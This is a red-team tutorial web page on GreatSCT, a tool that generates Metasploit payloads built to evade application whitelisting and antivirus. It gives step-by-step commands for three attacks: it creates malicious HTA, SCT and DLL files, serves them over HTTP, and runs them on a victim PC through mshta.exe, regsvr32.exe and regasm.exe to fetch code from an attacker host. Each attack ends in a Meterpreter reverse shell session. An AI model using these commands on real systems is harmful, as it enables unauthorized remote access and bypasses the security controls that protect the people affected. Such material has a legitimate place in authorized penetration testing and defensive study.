<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">GreatSct – An Application Whitelist Bypass Tool</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/greatsct-an-application-whitelist-bypass-tool/" rel="bookmark"><time class="entry-date published" datetime="2019-01-26T07:46:51+00:00">January 26, 2019</time><time class="updated" datetime="2025-06-03T13:29:10+00:00">June 3, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">While writing <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/penetration-testing/">Applocker bypass series</a></span>, we found a new tool which was specially designed for bypassing whitelisting application.  So I decided to write this article where we are introducing another most interesting tool “Great SCT –A Metasploit payload generator” tool which is similar to Unicorn or msfvenom because it depends on the Metasploit framework to provide reverse connection of the victim’s machine. So let’s began with its tutorial and check its functionality.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">GreatSCT</span></li>
<li class="ai-optimize-9"><span style="color: #000000;">Installation &amp; Usages</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Generate malicious hta file</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Generate malicious sct file</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Generate malicious dll file</span></li>
</ul>
<h3 class="ai-optimize-13"><span style="color: #800000;">GreatSCT</span></h3>
<p class="ai-optimize-14"><span style="color: #000000;">GreatSCT is current under support by @ConsciousHacker, the project is called Great SCT (Great Scott). Great SCT is an open source project to generate application whitelist bypasses. This tool is intended for BOTH red and blue team. It is a tool designed to generate Metasploit payloads that bypass common anti-virus solutions and application whitelisting solutions.</span></p>
<p class="ai-optimize-15"><span style="color: #000000;"><em>You can download it from here: <span style="color: #3366ff;"><a style="color: #3366ff;" href="//github.com/GreatSCT/GreatSCT">//github.com/GreatSCT/GreatSCT</a></span></em></span></p>
<p class="ai-optimize-16"><span style="color: #000000;"><strong>Installation &amp; </strong><strong>Usages</strong></span></p>
<p class="ai-optimize-17"><span style="color: #000000;">It must first be downloaded and installed in order to start using Great SCT. Run the following command to download Great SCT from github and also take care of its dependency tools while installing it.</span></p>
<p class="ai-optimize-18"><span style="color: #000000;">This help to bypass Applocker policy by using the following tools:</span></p>
<ul>
<li class="ai-optimize-19"><span style="color: #000000;"><strong>Installutil.exe : </strong>The Installer tool is a command- line tool that lets you install and uninstall server resources in specific assemblies by running the installer components.</span></li>
<li class="ai-optimize-20"><span style="color: #000000;"><strong>Msbuild.exe :</strong> The Microsoft Build Engine is a platform for building applications. This engine, which is also known as MSBuild.</span></li>
<li class="ai-optimize-21"><span style="color: #000000;"><strong>Mshta.exe :</strong> Mshta.exe runs the Microsoft HTML Application Host, the Windows OS utility responsible for running HTA( HTML Application) files. HTML files that we can run JavaScript or Visual with.</span></li>
<li class="ai-optimize-22"><span style="color: #000000;"><strong>Regasm.exe</strong> : The Assembly Registration tool reads the metadata within an assembly and adds the necessary entries to the registry, which allows COM clients to create .NET Framework classes transparently. </span></li>
<li class="ai-optimize-23"><span style="color: #000000;"><strong>Regsvcs.exe : </strong>RegSvcs stands for Microsoft .NET Remote Registry Services it is known for .NET Services Installation.</span></li>
<li class="ai-optimize-24"><span style="color: #000000;"><strong>Regsvr32.exe :</strong> Regsvr32 is a command line utility for register and unregister OLE controls in the Windows Registry, such as DLLs and ActiveX controls.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT
cd setup
./setup.sh</pre>
<p class="ai-optimize-25"><span style="color: #000000;">Once it’s downloaded, type the following command to access the help commands:</span></p>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-oX3UcKfZaOI/XEwLhKlDRcI/AAAAAAAAcXw/CHj86zUyAVQyWNBIqeBqpmO1XQjLQ-e_wCLcBGAs/s1600/1.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use Bypass</pre>
<p class="ai-optimize-27"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-arKGGScomc4/XEwLh8CyZII/AAAAAAAAcX0/4BLzysFzSRsZMdWTgoSpGBiyFP3AGlFXQCLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-28"><span style="color: #000000;">Now to get the list of payloads type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">list</pre>
<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-rwhrP4ptiF4/XEwLkLURm7I/AAAAAAAAcYc/6jCxLz8vwtc17cqrKiL8ygUqTrFWcq18QCLcBGAs/s1600/3.png"/></span></p>
<h3 class="ai-optimize-30"><span style="color: #800000;">Generate malicious hta file </span></h3>
<p class="ai-optimize-31"><span style="color: #000000;">Now from the list of payloads, you can choose anyone for your desired attack. But for this attack we will use :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use mshta/shellcode_inject/base64_migrate.py</pre>
<p class="ai-optimize-32"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-skPXDHxK8k4/XEwLlkP2SCI/AAAAAAAAcY4/Y0xRyVXKwb8ACQgMLsfhMH1fQHTIVBXgwCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-33"><span style="color: #000000;">Once the command is executed, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">generate</pre>
<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-6LQPVvZE-yY/XEwLl0WR82I/AAAAAAAAcY8/amszk8TZFPArUaJ8f2fi8vAv8PB7gmXjQCLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-35"><span style="color: #000000;">After executing the generate command, it asks you which method you want to use. As we will use msfvenom<strong> type 1</strong> to choose the first option. Then click enter for meterpreter. Then supply lhost and lport, i.e. 192.168.1.107, 4321 respectively.</span></p>
<p class="ai-optimize-36"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-37DnY2EuCZQ/XEwLmI-6eqI/AAAAAAAAcZE/0S1ZVHxk6EkEqF2OSS14dace2GPSaoE5ACLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-37"><span style="color: #000000;">When generating the shellcode, it will ask you to give a name for a payload. By default, it will take ‘payload’ as name. As I didn’t want to give any name, I simply pressed enter.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-KNIJm5IlVFQ/XEwLmBNWc7I/AAAAAAAAcZA/QPSVcTkdNPQGi24Dp8zekik6IEDo0RO4gCLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-39"><span style="color: #000000;">Now, it made two files. One resource file and other an hta file.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-e3rl1xYZDSY/XEwLmdfSNyI/AAAAAAAAcZI/3TBu_1yN0iUvEKSFwFQHdZJ7JDjVchSWACLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-41"><span style="color: #000000;">Now, firstly, start the python’s server in /usr/share/greatsct-output/source by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-LmGUvASB8nI/XEwLm8I5GmI/AAAAAAAAcZM/Bat9npdz758uZRovRaEpf6pRNhpLcinMgCLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-43"><span style="color: #000000;">Now execute the hta file in the command prompt of the victim’s PC.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta.exe //192.168.1.107/payload.hta</pre>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-hOYV3b8d_-8/XEwLhOkeYnI/AAAAAAAAcXs/D6YSSWMh6qc-erPHwAW7mHIt1ay5iUApgCLcBGAs/s1600/10.png"/></span></p>
<p class="ai-optimize-45"><span style="color: #000000;">Simultaneously, start the multi/handler using the resource file. For this, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</pre>
<p class="ai-optimize-46"><span style="color: #000000;">And voila! You have your session.</span></p>
<p class="ai-optimize-47"><span style="color: #000000;">Visit here “<span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/bypass-application-whitelisting-using-mshta-exe-multiple-methods/">Bypass Application Whitelisting using mshta.exe (Multiple Methods)</a></span>” to learn more about mshta.exe techniques.</span></p>
<p class="ai-optimize-48"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-01d4uflJQ8E/XEwLhAbHxWI/AAAAAAAAcXo/jyO_iSMRb1cobYwCEMcApBOX7hvdf3m3ACLcBGAs/s1600/11.png"/></span></p>
<h3 class="ai-optimize-49"><span style="color: #800000;">Generate malicious sct file </span></h3>
<p class="ai-optimize-50"><span style="color: #000000;">Now from the list of payloads, you can choose anyone for your desired attack. But for this attack we will use :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use regsvr32/shellcode_inject/base64_migrate.py</pre>
<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-avt3iGirv1c/XEwLiFzZnzI/AAAAAAAAcX4/IO1pctn_HiUoC5d2Hsu2O-yqDG9b1gOxwCLcBGAs/s1600/20.png"/></span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Once the command is executed, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">generate</pre>
<p class="ai-optimize-53"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-9uSYaApk_FE/XEwLiFdEBuI/AAAAAAAAcX8/mLqDhItQgmUda9RNknz-8PRrbagFx_X2ACLcBGAs/s1600/21.png"/></span></p>
<p class="ai-optimize-54"><span style="color: #000000;">Then it will ask you for payload. Just press enter as it will take <strong>windows/meterpreter/reverse_tcp</strong> as a default payload and that is the one we need. After that provide IP like here we have given 192.168.1.107 and the given port (any) as here you can see in the image below that we have given lport as 2345</span></p>
<p class="ai-optimize-55"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-9Yrlffq9wxI/XEwLitKyCxI/AAAAAAAAcYA/qNDewOYsl4wINaeP56WnfcNM6QhzOPEOQCLcBGAs/s1600/23.png"/></span></p>
<p class="ai-optimize-56"><span style="color: #000000;">After giving the details, it will ask you name for your malware. By default, it will set name ‘payload’ so either you can give the name or just press enter for the default settings.</span></p>
<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-D0z7vDAlmz4/XEwLivIXkMI/AAAAAAAAcYE/UWWYHk_QGpkZhUT4v1lBQaByLXlmCUxaQCLcBGAs/s1600/24.png"/></span></p>
<p class="ai-optimize-58"><span style="color: #000000;">And just as you press enter it will generate two files. One of them will a resource file and others will be .sct file. Now start the python’s server in /usr/share/greatsct-output/source by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-3NkoHn1s2_Y/XEwLjF8ph3I/AAAAAAAAcYM/yEEQnp4u24oaln_epsQeIjsEtm2214l-gCLcBGAs/s1600/26.png"/></span></p>
<p class="ai-optimize-60"><span style="color: #000000;">Now execute the .sct file in the run window of the victim’s PC as shown below</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr32.exe /s /u /n /i://192.168.1.107/payload.sct</pre>
<p class="ai-optimize-61"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-P-koVgqQoQ4/XEwLjEgoNYI/AAAAAAAAcYQ/bDpQyOScWxMbBqGGUMUlk3IiSCVTeL2yQCLcBGAs/s1600/27.png"/></span></p>
<p class="ai-optimize-62"><span style="color: #000000;">Simultaneously, start the multi/handler using the resource file. For this, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</pre>
<p class="ai-optimize-63"><span style="color: #000000;">And voila! You have your session.</span></p>
<p class="ai-optimize-64"><span style="color: #000000;">Visit here “<span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/">Bypass Application Whitelisting using regsrv32.exe (Multiple Methods)</a></span>” to learn more about mshta.exe techniques.</span></p>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-d5UqIUZt1iY/XEwLjXFlWNI/AAAAAAAAcYU/0slmCDuwt2gvFUlimWDm-VGJpMayZSQNgCLcBGAs/s1600/28.png"/></span></p>
<h3 class="ai-optimize-66"><span style="color: #800000;">Generate malicious dll file </span></h3>
<p class="ai-optimize-67"><span style="color: #000000;">Now from the list of payloads, you can choose anyone for your desired attack. But for this attack we will use :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use regasm/meterpreter/rev_tcp.py</pre>
<p class="ai-optimize-68"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-a6ul0QnHVKU/XEwLjx5AU-I/AAAAAAAAcYY/dU193gqOTXgiYAvr8bZATqgrcu9InlyfgCLcBGAs/s1600/29.png"/></span></p>
<p class="ai-optimize-69"><span style="color: #000000;">Once the command is executed, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set lhost 192.168.1.107
generate</pre>
<p class="ai-optimize-70"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-NF4-G2oaGU0/XEwLkdXCGyI/AAAAAAAAcYg/6cDQmrrUYFAQI1kKLY3MV1o77uG_5FkUwCLcBGAs/s1600/30.png"/></span></p>
<p class="ai-optimize-71"><span style="color: #000000;">After giving the details, it will ask you a name for your malware. By default, it will set name ‘payload’ so either you can give the name or just press enter for the default settings.</span></p>
<p class="ai-optimize-72"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-rqFCC5IZxc4/XEwLkXqrWgI/AAAAAAAAcYk/4m7B2VWny8QO-7WNuGOXBO06niDYoqswwCLcBGAs/s1600/31.png"/></span></p>
<p class="ai-optimize-73"><span style="color: #000000;">And just as you press enter it will generate dll files. </span></p>
<p class="ai-optimize-74"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-TT2GzTye608/XEwLkhP5thI/AAAAAAAAcYo/9xWZEm_rRj8zan1DylXEUCfHRbHcmmLZACLcBGAs/s1600/32.png"/></span></p>
<p class="ai-optimize-75"><span style="color: #000000;">Now start the python’s server in /usr/share/greatsct-output/compiled by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-9fE0FGnCleM/XEwLk5feK1I/AAAAAAAAcYs/GvUbVLXptsQspnbvTn7Xump4bzoPdOCVgCLcBGAs/s1600/33.png"/></span></p>
<p class="ai-optimize-77"><span style="color: #000000;">Now place above generated dll file inside : C:\Windows\Microsoft.NET\Framework\v4.0.30319\v4.0.30319\ and then  execute the .dll file in the run window of the victim’s PC as shown below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll</pre>
<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-73HLQwee46s/XEwLlGeuw0I/AAAAAAAAcYw/vnfkz6mIlfUUCw5ICpG9_DfEyMm6I1pegCLcBGAs/s1600/34.png"/></span></p>
<p class="ai-optimize-79"><span style="color: #000000;">Simultaneously, start the multi/handler using the resource file. For this, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</pre>
<p class="ai-optimize-80"><span style="color: #000000;">And voila! You have your session.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-x89rByktDoo/XEwLlR769DI/AAAAAAAAcY0/ckcDeCy6oxIAa9h3gohDeGBi6JAvqTc3ACLcBGAs/s1600/35.png"/></span></p>
<p class="ai-optimize-82"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles, an Information Security Consultant, Social Media Lover, and Gadgets. Contact</span><strong><a href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
